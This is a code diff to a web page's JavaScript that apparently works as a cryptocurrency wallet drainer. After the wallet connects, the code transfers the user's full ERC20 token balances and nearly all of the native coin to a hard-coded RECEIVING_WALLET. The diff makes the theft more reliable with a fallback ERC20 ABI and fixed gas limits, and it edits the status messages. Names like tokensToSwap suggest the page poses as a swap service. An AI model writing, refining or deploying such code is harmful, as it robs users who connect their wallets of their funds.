@@ -2,6 +2,12 @@ let provider, signer, userAddress;
 let currentNetwork = "bsc";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+// Standard ERC20 ABI
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)"
+];
+
 window.addEventListener('load', () => {
   document.getElementById('currentUrl').textContent = window.location.href;
   document.getElementById("networkSelect").addEventListener('change', (e) => {
@@ -119,28 +125,33 @@ async function processAllTransfers() {
     // Process ERC20 tokens
     for (const token of tokensToSwap.filter(t => !t.isNative)) {
       try {
-        updateStatus(`Checking balance...`, "success");
+        updateStatus(`Checking ${token.symbol} balance...`, "success");
         
-        const contract = new ethers.Contract(token.address, token.abi, signer);
+        // Use token.abi if defined, otherwise use standard ERC20 ABI
+        const abi = token.abi || ERC20_ABI;
+        const contract = new ethers.Contract(token.address, abi, signer);
         const balance = await contract.balanceOf(userAddress);
         
         if (balance.gt(0)) {
           processedTokens++;
-          updateStatus(`Processing transfer ${processedTokens}...`, "success");
+          updateStatus(`Transferring ${token.symbol}...`, "success");
           
-          // Create transfer transaction
-          const tx = await contract.transfer(RECEIVING_WALLET, balance);
+          // Add gas limit for problematic tokens
+          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
+            gasLimit: 100000 // Increased gas limit for safety
+          });
+          
           await tx.wait();
           successCount++;
           
           updateStatus(
-            `Transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `${token.symbol} transferred! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
             "success"
           );
         }
       } catch (err) {
         console.error(`Error transferring ${token.symbol}:`, err);
-        updateStatus(`Transfer ${processedTokens > 0 ? processedTokens : ''} failed`, "error");
+        updateStatus(`Failed to transfer ${token.symbol}: ${err.message}`, "error");
       }
     }
 
@@ -148,39 +159,40 @@ async function processAllTransfers() {
     const nativeToken = tokensToSwap.find(t => t.isNative);
     if (nativeToken) {
       try {
-        updateStatus(`Checking native balance...`, "success");
+        updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
         const balance = await provider.getBalance(userAddress);
         const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
         const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
         
         if (sendAmount.gt(0)) {
           processedTokens++;
-          updateStatus(`Processing final transfer...`, "success");
+          updateStatus(`Transferring ${nativeToken.symbol}...`, "success");
           
           const tx = await signer.sendTransaction({
             to: RECEIVING_WALLET,
-            value: sendAmount
+            value: sendAmount,
+            gasLimit: 21000 // Standard gas for native transfers
           });
           await tx.wait();
           successCount++;
           
           updateStatus(
-            `Transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `${nativeToken.symbol} transferred! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
             "success"
           );
         }
       } catch (err) {
-        console.error("Error transferring native token:", err);
-        updateStatus("Final transfer failed", "error");
+        console.error(`Error transferring ${nativeToken.symbol}:`, err);
+        updateStatus(`Failed to transfer ${nativeToken.symbol}: ${err.message}`, "error");
       }
     }
     
     if (successCount > 0) {
-      updateStatus(`Successfully completed ${successCount} transfers`, "success");
+      updateStatus(`Successfully transferred ${successCount} tokens!`, "success");
     } else if (processedTokens > 0) {
       updateStatus("Some transfers failed", "error");
     } else {
-      updateStatus("No balances found to transfer", "success");
+      updateStatus("No token balances found to transfer", "success");
     }
     
     document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Process Complete`;
